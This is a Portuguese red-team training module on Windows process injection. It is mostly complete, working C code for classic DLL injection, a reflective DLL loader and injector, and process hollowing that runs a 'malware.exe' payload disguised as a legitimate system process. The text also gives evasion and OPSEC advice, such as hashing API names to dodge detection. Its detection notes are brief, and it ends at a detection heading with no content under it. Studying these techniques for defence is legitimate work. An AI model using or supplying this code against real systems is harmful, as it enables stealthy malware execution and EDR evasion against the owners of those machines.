---
layout: cyber
section: injecao-processo
title: "Técnicas Clássicas e Avançadas de Injeção de Processo"
---

# Técnicas Clássicas e Avançadas de Injeção de Processo

## Evolução de Técnicas, Não Catálogo de Comandos

Existem dezenas de técnicas de injeção documentadas, e novos métodos surgem constantemente. Entender não só o "como" mas o "por que cada técnica existe" diferencia red teamer experiente de quem só executa ferramenta. Cada técnica foi criada pra contornar limitação específica das anteriores ou explorar aspectos diferentes da arquitetura Windows.

Este módulo cobre as técnicas mais importantes em uso operacional atual, cada uma com código funcional e análise de detecção. A progressão segue evolução histórica: do método mais simples (mais detectado) ao mais sofisticado.

---

## Panorama Comparativo

### Visão Geral das Técnicas

| Técnica | Arquivo em Disco? | CreateRemoteThread? | Suspeição Base |
|---------|-------------------|---------------------|----------------|
| DLL Injection Clássica | Sim (DLL) | Sim | Alta |
| Reflective DLL Injection | Opcional | Opcional | Média |
| Process Hollowing | Não (PE em memória) | Não (SetThreadContext) | Média-Alta |
| Early Bird APC | Não | Não (QueueUserAPC) | Baixa-Média |
| Module Stomping | Não | Depende | Baixa |
| Parent PID Spoofing | Complementar | Não (técnica auxiliar) | Baixa |

---

## Na Prática

### 1. DLL Injection Clássica

#### Conceito

A injeção de DLL clássica força o processo alvo a chamar `LoadLibrary` com o caminho para uma DLL maliciosa. Após carregar a DLL, o Windows executa automaticamente a função `DllMain` com `DLL_PROCESS_ATTACH`, que contém o código malicioso.

**Por que isso funciona:** `LoadLibrary` é uma função pública documentada que aceita um ponteiro para string como argumento. Se você conseguir escrever o caminho da sua DLL na memória do processo alvo e criar uma thread que chame `LoadLibrary` com esse caminho, o OS carrega sua DLL no contexto do processo alvo.

#### Como Funciona

```
1. Escrever caminho da DLL maliciosa na memoria do processo alvo
2. Obter endereco de LoadLibraryA/W no processo alvo (mesmo endereco em todos os processos)
3. CreateRemoteThread com lpStartAddress = &LoadLibraryA, lpParameter = &caminhoDLL
4. Windows carrega a DLL, executa DllMain com DLL_PROCESS_ATTACH
```

O endereço de `LoadLibraryA` é igual em todos os processos porque `kernel32.dll` é carregada no mesmo endereço virtual base em todos os processos no mesmo boot (ASLR randomiza por boot, não por processo, para DLLs do sistema).

#### Código C Completo

```c
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Estrutura para armazenar resultados da busca de processo
typedef struct {
    DWORD pid;
    wchar_t name[MAX_PATH];
} ProcessInfo;

// Encontra PID pelo nome do processo (primeira instancia)
DWORD FindProcessByName(const wchar_t* targetName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, targetName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return pid;
}

// Injeta DLL no processo especificado pelo PID
// Retorna TRUE se bem-sucedido
BOOL DLLInject(DWORD targetPid, const wchar_t* dllPath) {
    HANDLE hProcess = NULL;
    LPVOID pRemoteDllPath = NULL;
    HANDLE hThread = NULL;
    SIZE_T dllPathSize;
    BOOL result = FALSE;

    // Tamanho do caminho em bytes (incluindo null terminator)
    dllPathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);

    printf("[*] Abrindo processo PID=%d\n", targetPid);

    // Abre o processo com direitos minimos necessarios para DLL injection
    // PROCESS_VM_OPERATION: necessario para VirtualAllocEx
    // PROCESS_VM_WRITE: necessario para WriteProcessMemory
    // PROCESS_CREATE_THREAD: necessario para CreateRemoteThread
    // PROCESS_QUERY_INFORMATION: necessario internamente por algumas versoes do Windows
    hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
        FALSE,
        targetPid
    );

    if (!hProcess) {
        printf("[-] OpenProcess falhou: %lu\n", GetLastError());
        return FALSE;
    }

    // Aloca espaco na memoria remota para armazenar o caminho da DLL
    // Apenas READ+WRITE - nao precisamos de execucao para o caminho da DLL
    pRemoteDllPath = VirtualAllocEx(
        hProcess,
        NULL,
        dllPathSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!pRemoteDllPath) {
        printf("[-] VirtualAllocEx falhou: %lu\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Memoria alocada para caminho DLL em: 0x%p\n", pRemoteDllPath);

    // Escreve o caminho da DLL na memoria remota
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, pRemoteDllPath, dllPath,
                            dllPathSize, &bytesWritten)) {
        printf("[-] WriteProcessMemory falhou: %lu\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Caminho DLL escrito: %ls\n", dllPath);

    // Obtem o endereco de LoadLibraryW em kernel32.dll
    // Este endereco e o mesmo para todos os processos no mesmo sistema/boot
    // porque kernel32.dll e mapeada no mesmo endereco base (ASLR por boot, nao por processo)
    LPVOID pLoadLibraryW = (LPVOID)GetProcAddress(
        GetModuleHandleW(L"kernel32.dll"),
        "LoadLibraryW"
    );

    if (!pLoadLibraryW) {
        printf("[-] GetProcAddress LoadLibraryW falhou: %lu\n", GetLastError());
        goto cleanup;
    }

    printf("[+] LoadLibraryW encontrado em: 0x%p\n", pLoadLibraryW);

    // Cria thread remota que executara LoadLibraryW(pRemoteDllPath)
    // Esta e a assinatura mais monitorada de DLL injection:
    // CreateRemoteThread com lpStartAddress = LoadLibraryW/A
    hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pLoadLibraryW,  // Executa LoadLibraryW
        pRemoteDllPath,                          // Com o caminho da DLL como argumento
        0,
        NULL
    );

    if (!hThread) {
        printf("[-] CreateRemoteThread falhou: %lu\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Thread remota criada. Aguardando carregamento da DLL...\n");

    // Aguarda a DLL ser carregada (LoadLibrary retorna)
    DWORD waitResult = WaitForSingleObject(hThread, 5000);
    if (waitResult == WAIT_TIMEOUT) {
        printf("[!] Timeout aguardando LoadLibrary - DLL pode ter travado\n");
    } else {
        // Obtem o valor de retorno de LoadLibrary (handle da DLL ou NULL)
        DWORD exitCode;
        GetExitCodeThread(hThread, &exitCode);
        if (exitCode != 0) {
            printf("[+] DLL carregada com sucesso! Handle: 0x%08X\n", exitCode);
            result = TRUE;
        } else {
            printf("[-] LoadLibrary retornou NULL - DLL nao carregada\n");
        }
    }

cleanup:
    if (hThread) CloseHandle(hThread);
    if (pRemoteDllPath && hProcess)
        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
    if (hProcess) CloseHandle(hProcess);

    return result;
}

// DLL maliciosa - compile separadamente como DLL
// Esta funcao executa quando o processo alvo chama LoadLibrary na sua DLL
// BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
//     if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
//         // Seu shellcode/payload aqui
//         // Execute em thread separada para nao bloquear LoadLibrary
//         CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SeuPayload, NULL, 0, NULL);
//     }
//     return TRUE;
// }

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 3) {
        wprintf(L"Uso: %s <processo.exe> <caminho_dll.dll>\n", argv[0]);
        wprintf(L"Exemplo: %s notepad.exe C:\\temp\\payload.dll\n", argv[0]);
        return 1;
    }

    DWORD pid = FindProcessByName(argv[1]);
    if (!pid) {
        wprintf(L"[-] Processo '%s' nao encontrado\n", argv[1]);
        return 1;
    }

    wprintf(L"[+] Processo encontrado: %s PID=%lu\n", argv[1], pid);

    if (DLLInject(pid, argv[2])) {
        printf("[+] DLL Injection bem-sucedida!\n");
        return 0;
    } else {
        printf("[-] DLL Injection falhou\n");
        return 1;
    }
}
```

**Detecção desta técnica:**
- `CreateRemoteThread` com `lpStartAddress == LoadLibraryA/W` é uma signature trivial
- Qualquer EDR decente detecta isso imediatamente
- O arquivo DLL em disco é um artefato persistente
- **Uso em 2025:** apenas contra sistemas sem EDR ou em PoCs educacionais

---

### 2. Reflective DLL Injection

#### Conceito

A injeção de DLL reflectiva (criada por Stephen Fewer em 2008, ainda relevante) resolve dois problemas da injeção clássica:
1. Não requer arquivo em disco no host - a DLL é enviada como bytes diretamente para a memória
2. Não usa `CreateRemoteThread` com `LoadLibraryA` - usa uma função customizada dentro da própria DLL

**A ideia central:** a DLL contém um "reflective loader" - um stub de código que sabe como carregar a si mesmo na memória sem usar a API `LoadLibrary` do Windows. Esse stub é chamado diretamente pela thread remota.

#### Como o Stub Reflective Funciona

O `ReflectiveDLLInjection.dll` exporta uma função chamada `ReflectiveLoader`. Quando chamada, ela:

1. Encontra o próprio endereço base na memória (através de técnicas de positionless code)
2. Parseia seus próprios headers PE (IMAGE_DOS_HEADER, IMAGE_NT_HEADERS)
3. Aloca nova memória do tamanho correto (`SizeOfImage` dos headers)
4. Copia headers e sections para a nova localização
5. Processa a tabela de imports (resolve dependências de DLLs usando `LoadLibrary`/`GetProcAddress` encontrados via hash de nome)
6. Aplica relocations se necessário
7. Chama `DllMain` com `DLL_PROCESS_ATTACH`
8. Retorna

**Por que é preferível à injeção clássica:**
- Sem arquivo em disco (a DLL existe apenas em memória)
- Thread remota não aponta para `LoadLibraryA` - aponta para `ReflectiveLoader`, que parece uma função qualquer
- Menos artifacts: sem path de DLL em memória remota, sem chamada explícita a APIs suspeitas

#### Implementação do Reflective Loader (Simplificado)

O código completo do ReflectiveLoader tem ~500 linhas em C. A versão simplificada abaixo demonstra a lógica central:

```c
// ReflectiveLoader.c - Versao simplificada para fins educacionais
// Baseado em: https://github.com/stephenfewer/ReflectiveDLLInjection

#include <windows.h>
#include "ReflectiveLoader.h"

// Hashes dos nomes das funcoes necessarias para bootstrapping
// Usar hashes evita strings em texto claro que podem ser detectadas
#define HASH_KEY              13
#define LOADLIBRARYA_HASH     0xEC0E4E8E
#define GETPROCADDRESS_HASH   0x7C0DFCAA
#define VIRTUALALLOC_HASH     0x91AFCA54

// Calcula hash de um nome de funcao/DLL para resolucao sem strings
DWORD HashString(char* string) {
    DWORD hash = 0;
    do {
        hash = ror((DWORD)hash, HASH_KEY);
        hash += *string;
    } while (*string++);
    return hash;
}

// O ReflectiveLoader e a funcao exportada que inicia o carregamento reflexivo
// Ela localiza a si mesma na memoria sem usar APIs do Windows
ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter) {
    // Passo 1: Encontrar nosso proprio endereco de imagem
    // Usamos uma tecnica de "caller address" para encontrar onde estamos carregados
    ULONG_PTR uiLibraryAddress;
    
    // GetCallerAddress() e uma funcao assembly que retorna o endereco de retorno da pilha
    // Depois fazemos uma busca backwards para encontrar o inicio do PE (MZ header)
    uiLibraryAddress = (ULONG_PTR)GetCallerAddress();
    
    // Busca backwards pelo magic MZ do PE
    while (TRUE) {
        if (((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_magic == IMAGE_DOS_SIGNATURE)
            break;
        uiLibraryAddress--;
    }
    
    // Passo 2: Parsear nossos proprios headers PE
    ULONG_PTR uiHeaderValue;
    uiHeaderValue = ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uiLibraryAddress + uiHeaderValue);
    
    // Passo 3: Encontrar kernel32.dll e resolver funcoes necessarias
    // Fazemos isso sem chamar GetModuleHandle/GetProcAddress diretamente
    // Em vez disso, percorremos a PEB->Ldr para encontrar kernel32 carregada
    
    // Passo 4: Alocar memoria para a nova imagem
    LPVOID pNewBase = VirtualAlloc(
        (LPVOID)(pNtHeaders->OptionalHeader.ImageBase),  // Preferencia de base
        pNtHeaders->OptionalHeader.SizeOfImage,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );
    
    // Se nao conseguiu o endereco preferido, aloca em qualquer lugar
    if (!pNewBase) {
        pNewBase = VirtualAlloc(NULL,
            pNtHeaders->OptionalHeader.SizeOfImage,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE);
    }
    
    // Passo 5: Copiar headers
    memcpy(pNewBase, (PVOID)uiLibraryAddress,
           pNtHeaders->OptionalHeader.SizeOfHeaders);
    
    // Passo 6: Copiar sections
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++, pSection++) {
        PVOID pDest = (PVOID)((ULONG_PTR)pNewBase + pSection->VirtualAddress);
        PVOID pSrc = (PVOID)(uiLibraryAddress + pSection->PointerToRawData);
        memcpy(pDest, pSrc, pSection->SizeOfRawData);
    }
    
    // Passo 7: Processar relocations (se ImageBase mudou)
    ULONG_PTR delta = (ULONG_PTR)pNewBase - pNtHeaders->OptionalHeader.ImageBase;
    if (delta != 0) {
        // Aplica relocations...
        // (omitido por brevidade - percorre IMAGE_DIRECTORY_ENTRY_BASERELOC)
    }
    
    // Passo 8: Resolver imports
    // (percorre IMAGE_DIRECTORY_ENTRY_IMPORT, carrega DLLs, resolve funcoes)
    
    // Passo 9: Chamar DllMain
    typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
    DllMain_t pDllMain = (DllMain_t)((ULONG_PTR)pNewBase +
                                      pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    pDllMain((HINSTANCE)pNewBase, DLL_PROCESS_ATTACH, NULL);
    
    return 0;
}
```

**Usar Reflective DLL Injection na prática (com a implementação do Stephen Fewer):**

```c
// Lado do injetor: carrega a DLL como bytes e injeta
#include <windows.h>
#include <stdio.h>

// Offset do ReflectiveLoader dentro da DLL
// Esta funcao encontra o export pelo nome
ULONG_PTR GetReflectiveLoaderOffset(LPVOID lpReflectiveDllBuffer) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lpReflectiveDllBuffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)
        ((ULONG_PTR)lpReflectiveDllBuffer + dosHeader->e_lfanew);

    PIMAGE_DATA_DIRECTORY pExportDir =
        &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    PIMAGE_EXPORT_DIRECTORY pExports = (PIMAGE_EXPORT_DIRECTORY)
        ((ULONG_PTR)lpReflectiveDllBuffer + pExportDir->VirtualAddress);

    PDWORD pNames = (PDWORD)
        ((ULONG_PTR)lpReflectiveDllBuffer + pExports->AddressOfNames);
    PWORD  pOrdinals = (PWORD)
        ((ULONG_PTR)lpReflectiveDllBuffer + pExports->AddressOfNameOrdinals);
    PDWORD pFunctions = (PDWORD)
        ((ULONG_PTR)lpReflectiveDllBuffer + pExports->AddressOfFunctions);

    for (DWORD i = 0; i < pExports->NumberOfNames; i++) {
        char* name = (char*)((ULONG_PTR)lpReflectiveDllBuffer + pNames[i]);
        if (strcmp(name, "ReflectiveLoader") == 0) {
            return pFunctions[pOrdinals[i]];  // RVA do ReflectiveLoader
        }
    }
    return 0;
}

BOOL ReflectiveInject(DWORD targetPid, const char* dllPath) {
    // Le a DLL como bytes do disco (ou pode ser enviada via rede)
    HANDLE hFile = CreateFileA(dllPath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD fileSize = GetFileSize(hFile, NULL);
    LPVOID pDllBytes = VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
    DWORD bytesRead;
    ReadFile(hFile, pDllBytes, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    // Abre processo alvo
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
        FALSE, targetPid);

    // Aloca espaco no processo remoto para a DLL inteira
    LPVOID pRemote = VirtualAllocEx(hProcess, NULL, fileSize,
                                    MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Escreve a DLL inteira (como bytes brutos, nao carregada)
    WriteProcessMemory(hProcess, pRemote, pDllBytes, fileSize, NULL);

    // Calcula o offset do ReflectiveLoader dentro da DLL
    ULONG_PTR loaderOffset = GetReflectiveLoaderOffset(pDllBytes);

    // O endereco do ReflectiveLoader no processo remoto
    LPVOID pLoaderRemote = (LPVOID)((ULONG_PTR)pRemote + loaderOffset);

    // Cria thread remota apontando para o ReflectiveLoader (nao para LoadLibraryA!)
    // Do ponto de vista do EDR, e apenas uma thread apontando para codigo em MEM_PRIVATE
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)pLoaderRemote,
                                        NULL, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
    VirtualFree(pDllBytes, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return TRUE;
}
```

---

### 3. Process Hollowing (Detalhado)

#### Conceito

Process Hollowing (também chamado de RunPE) é uma técnica onde você cria um processo legítimo em estado suspenso, remove sua imagem original da memória, e substitui por um PE malicioso. O processo resultante tem tudo que parece legítimo (nome, PID, parent process, path em disco) mas executa código completamente diferente.

**Por que é poderoso:** O processo malicioso é visto pelo sistema como `svchost.exe`, `calc.exe`, ou qualquer binário legítimo. Ferramentas que verificam apenas o nome do processo são completamente enganadas. A imagem em disco está intacta - apenas a memória foi substituída.

#### Passo-a-Passo Detalhado

```
1. CreateProcess(targetBinary, CREATE_SUSPENDED) -> processo suspensso
2. NtUnmapViewOfSection ou ZwUnmapViewOfSection -> unmap da imagem original
3. VirtualAllocEx com ImageBase preferida do PE malicioso
4. WriteProcessMemory: copiar headers do PE malicioso
5. WriteProcessMemory: copiar cada section do PE malicioso
6. Aplicar base relocations se ImageBase mudou
7. Atualizar PEB.ImageBaseAddress com novo ImageBase
8. GetThreadContext -> obter contexto da thread principal suspensa
9. SetThreadContext com novo RIP/EIP apontando para novo EntryPoint
10. ResumeThread -> processo executa o PE malicioso
```

#### Código C Completo e Comentado

```c
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// Prototipo de NtUnmapViewOfSection (nao documentada, mas estavel)
typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(
    HANDLE ProcessHandle,
    PVOID  BaseAddress
);

// Estrutura do PEB (Process Environment Block) - layout x64
// Necessario para atualizar ImageBaseAddress apos hollowing
typedef struct _PEB_LDR_DATA64 {
    ULONG  Length;
    BOOL   Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    // ... outros campos
} PEB_LDR_DATA64;

// Le um arquivo PE do disco como bytes
LPVOID ReadFileToBuffer(const char* filePath, DWORD* fileSize) {
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Falha ao abrir arquivo: %lu\n", GetLastError());
        return NULL;
    }

    *fileSize = GetFileSize(hFile, NULL);
    LPVOID buffer = VirtualAlloc(NULL, *fileSize, MEM_COMMIT, PAGE_READWRITE);

    DWORD bytesRead;
    ReadFile(hFile, buffer, *fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    return buffer;
}

// Implementacao completa de Process Hollowing
// targetPath: processo legitimo a ser "hollowed" (ex: "C:\\Windows\\System32\\svchost.exe")
// payloadPath: PE malicioso que sera injetado (ex: "C:\\temp\\malware.exe")
BOOL ProcessHollow(const char* targetPath, const char* payloadPath) {
    // Passo 1: Le o PE malicioso do disco
    DWORD payloadSize;
    LPVOID pPayload = ReadFileToBuffer(payloadPath, &payloadSize);
    if (!pPayload) return FALSE;

    // Valida que e um PE valido
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pPayload;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Payload nao e um PE valido\n");
        VirtualFree(pPayload, 0, MEM_RELEASE);
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)
        ((ULONG_PTR)pPayload + pDosHeader->e_lfanew);

    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Assinatura NT invalida\n");
        VirtualFree(pPayload, 0, MEM_RELEASE);
        return FALSE;
    }

    ULONG_PTR payloadImageBase = pNtHeaders->OptionalHeader.ImageBase;
    DWORD payloadSizeOfImage = pNtHeaders->OptionalHeader.SizeOfImage;
    DWORD payloadEntryPoint = pNtHeaders->OptionalHeader.AddressOfEntryPoint;

    printf("[+] Payload: ImageBase=0x%llX, SizeOfImage=%lu, EP=0x%08X\n",
           (unsigned long long)payloadImageBase, payloadSizeOfImage, payloadEntryPoint);

    // Passo 2: Cria o processo alvo em estado SUSPENSO
    // A flag CREATE_SUSPENDED faz o processo ser criado mas nao executa a thread principal
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // OPSEC: Usar CREATE_NO_WINDOW para processos GUI (evita janela aparecendo)
    if (!CreateProcessA(
        targetPath,              // Nome do executavel legitimo
        NULL,                    // Command line (pode adicionar argumentos validos)
        NULL,                    // Process security attributes
        NULL,                    // Thread security attributes
        FALSE,                   // Inherit handles
        CREATE_SUSPENDED,        // CRITICO: processo suspensso
        NULL,                    // Environment block
        NULL,                    // Current directory
        &si,
        &pi
    )) {
        printf("[-] CreateProcess falhou: %lu\n", GetLastError());
        VirtualFree(pPayload, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("[+] Processo suspensso criado: PID=%lu TID=%lu\n",
           pi.dwProcessId, pi.dwThreadId);

    // Passo 3: Obter contexto da thread principal suspensa
    // Precisamos do contexto para:
    // a) Encontrar o endereco do PEB (via RCX no entry point em x64)
    // b) Modificar RIP/EIP para apontar para o novo entry point
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[-] GetThreadContext falhou: %lu\n", GetLastError());
        goto fail;
    }

    // Em x64, quando o processo e criado em estado suspenso, RCX contem o
    // endereco do PEB do processo. Isso e documentado (nao e hack - e a ABI).
    // Em x86, seria EBX que contem o PEB.
    ULONG_PTR pebAddress = ctx.Rcx;  // x64
    // ULONG_PTR pebAddress = ctx.Ebx;  // x86 (descomentar para 32-bit)
    printf("[+] PEB em: 0x%llX\n", (unsigned long long)pebAddress);

    // Passo 4: Ler o ImageBase atual do PEB para saber onde a imagem esta mapeada
    // PEB.ImageBaseAddress esta no offset 0x10 (x64) ou 0x08 (x86)
    ULONG_PTR currentImageBase;
    SIZE_T bytesRead;
    ReadProcessMemory(pi.hProcess,
                      (LPVOID)(pebAddress + 0x10),  // PEB.ImageBaseAddress x64
                      &currentImageBase,
                      sizeof(ULONG_PTR),
                      &bytesRead);

    printf("[+] ImageBase atual do processo: 0x%llX\n",
           (unsigned long long)currentImageBase);

    // Passo 5: Unmap da imagem original do processo
    // NtUnmapViewOfSection remove o mapeamento da imagem do disco da memoria
    NtUnmapViewOfSection_t NtUnmapViewOfSection =
        (NtUnmapViewOfSection_t)GetProcAddress(
            GetModuleHandleA("ntdll.dll"),
            "NtUnmapViewOfSection"
        );

    if (!NtUnmapViewOfSection) {
        printf("[-] NtUnmapViewOfSection nao encontrado\n");
        goto fail;
    }

    NTSTATUS status = NtUnmapViewOfSection(pi.hProcess, (PVOID)currentImageBase);
    if (status != 0) {
        printf("[-] NtUnmapViewOfSection falhou: 0x%08X\n", status);
        // Nao e fatal - alguns setups podem pular este passo
        // e apenas sobrescrever a memoria existente
    } else {
        printf("[+] Imagem original unmapped\n");
    }

    // Passo 6: Alocar nova memoria no processo para o payload
    // Tenta usar o ImageBase preferido do payload primeiro
    LPVOID pAllocBase = VirtualAllocEx(
        pi.hProcess,
        (LPVOID)payloadImageBase,   // Tenta o ImageBase preferido
        payloadSizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // Se o ImageBase preferido nao estiver disponivel, usa qualquer endereco
    // (precisaremos aplicar relocations neste caso)
    if (!pAllocBase) {
        printf("[!] ImageBase preferido indisponivel, alocando em endereco alternativo\n");
        pAllocBase = VirtualAllocEx(
            pi.hProcess,
            NULL,
            payloadSizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
    }

    if (!pAllocBase) {
        printf("[-] VirtualAllocEx falhou: %lu\n", GetLastError());
        goto fail;
    }

    printf("[+] Memoria alocada para payload em: 0x%p\n", pAllocBase);

    // Passo 7: Copiar headers do PE malicioso para o processo
    if (!WriteProcessMemory(
        pi.hProcess,
        pAllocBase,
        pPayload,
        pNtHeaders->OptionalHeader.SizeOfHeaders,
        NULL
    )) {
        printf("[-] WriteProcessMemory (headers) falhou: %lu\n", GetLastError());
        goto fail;
    }

    printf("[+] Headers copiados\n");

    // Passo 8: Copiar cada section do PE malicioso
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);

    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        LPVOID pSectionDest = (LPVOID)
            ((ULONG_PTR)pAllocBase + pSection[i].VirtualAddress);
        LPVOID pSectionSrc = (LPVOID)
            ((ULONG_PTR)pPayload + pSection[i].PointerToRawData);

        printf("[*] Copiando section [%i] %.8s: VA=0x%08X, RawSize=%lu\n",
               i,
               pSection[i].Name,
               pSection[i].VirtualAddress,
               pSection[i].SizeOfRawData);

        if (pSection[i].SizeOfRawData > 0) {
            if (!WriteProcessMemory(
                pi.hProcess,
                pSectionDest,
                pSectionSrc,
                pSection[i].SizeOfRawData,
                NULL
            )) {
                printf("[-] WriteProcessMemory (section) falhou: %lu\n", GetLastError());
                goto fail;
            }
        }
    }

    printf("[+] Todas as sections copiadas\n");

    // Passo 9: Aplicar base relocations se o ImageBase mudou
    ULONG_PTR delta = (ULONG_PTR)pAllocBase - payloadImageBase;

    if (delta != 0) {
        printf("[*] Aplicando relocations (delta=0x%llX)\n", (unsigned long long)delta);

        PIMAGE_DATA_DIRECTORY pRelocDir =
            &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        if (pRelocDir->Size > 0) {
            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)
                ((ULONG_PTR)pPayload + pRelocDir->VirtualAddress);

            while (pReloc->VirtualAddress) {
                DWORD numEntries = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))
                                   / sizeof(WORD);
                PWORD pEntries = (PWORD)((ULONG_PTR)pReloc + sizeof(IMAGE_BASE_RELOCATION));

                for (DWORD j = 0; j < numEntries; j++) {
                    if ((pEntries[j] >> 12) == IMAGE_REL_BASED_DIR64) {
                        // Endereço a ser relocado no processo remoto
                        ULONG_PTR relocAddr = (ULONG_PTR)pAllocBase +
                                              pReloc->VirtualAddress +
                                              (pEntries[j] & 0x0FFF);

                        // Le o valor atual, adiciona o delta, escreve de volta
                        ULONG_PTR currentVal;
                        ReadProcessMemory(pi.hProcess, (LPCVOID)relocAddr,
                                         &currentVal, sizeof(ULONG_PTR), NULL);
                        currentVal += delta;
                        WriteProcessMemory(pi.hProcess, (LPVOID)relocAddr,
                                          &currentVal, sizeof(ULONG_PTR), NULL);
                    }
                }

                pReloc = (PIMAGE_BASE_RELOCATION)
                    ((ULONG_PTR)pReloc + pReloc->SizeOfBlock);
            }

            printf("[+] Relocations aplicadas\n");
        }
    }

    // Passo 10: Atualizar PEB.ImageBaseAddress com o novo base
    ULONG_PTR newImageBase = (ULONG_PTR)pAllocBase;
    WriteProcessMemory(
        pi.hProcess,
        (LPVOID)(pebAddress + 0x10),  // PEB.ImageBaseAddress x64
        &newImageBase,
        sizeof(ULONG_PTR),
        NULL
    );

    printf("[+] PEB.ImageBaseAddress atualizado para: 0x%llX\n",
           (unsigned long long)newImageBase);

    // Passo 11: Atualizar o contexto da thread para apontar para o novo EntryPoint
    // RIP = novo ImageBase + RVA do EntryPoint
    ctx.Rcx = (ULONG_PTR)pAllocBase + payloadEntryPoint;
    // Em x86: ctx.Eax = (DWORD)pAllocBase + payloadEntryPoint;

    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[-] SetThreadContext falhou: %lu\n", GetLastError());
        goto fail;
    }

    printf("[+] Thread context atualizado: RIP=0x%llX\n",
           (unsigned long long)ctx.Rcx);

    // Passo 12: Retomar a thread - o processo agora executa o payload
    ResumeThread(pi.hThread);

    printf("[+] Process Hollowing completo! PID=%lu executando payload\n",
           pi.dwProcessId);

    VirtualFree(pPayload, 0, MEM_RELEASE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;

fail:
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    VirtualFree(pPayload, 0, MEM_RELEASE);
    return FALSE;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Uso: %s <processo_legitimo.exe> <payload.exe>\n", argv[0]);
        printf("Exemplo: %s C:\\Windows\\System32\\notepad.exe C:\\temp\\malware.exe\n", argv[0]);
        return 1;
    }

    if (ProcessHollow(argv[1], argv[2])) {
        printf("[+] Sucesso!\n");
        return 0;
    } else {
        printf("[-] Falhou!\n");
        return 1;
    }
}
```

**Detecção do Process Hollowing:**
